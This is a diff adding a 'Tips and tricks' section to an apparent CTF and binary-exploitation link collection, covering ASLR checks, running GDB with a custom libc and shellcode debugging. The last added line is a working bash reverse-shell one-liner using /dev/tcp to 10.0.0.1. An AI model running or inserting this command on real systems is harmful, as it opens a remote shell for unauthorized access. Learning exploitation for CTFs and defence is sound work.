@@ -58,6 +58,15 @@ This repository contains interesting links and notes about pwning stuff, along w
 - [x86 Exploitation 101: heap overflows… unlink me, would you please?](https://gbmaster.wordpress.com/2014/08/11/x86-exploitation-101-heap-overflows-unlink-me-would-you-please/) • dlmalloc, heap, unlink
 
 
+## Tips and tricks
+
+- `cat /proc/self/maps` for checking if ASLR is enabled or not
+- `setarch x86_64 --addr-no-randomize /bin/bash` starts a fresh environment without ASLR (it will break setuid binaries)
+- `set exec-wrapper env "LD_PRELOAD=./libc.so.6"` for loading in GDB a custom libc
+- insert `\xcc` (INT 3) at the beginning of a shellcode to stop the program executing it and return to the debugger (for testing purposes)
+- `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` starts a bash reverse shell
+
+
 ## Write-ups
 
 - [0ctf Quals 2017 - BabyHeap2017](http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html) • fastbins
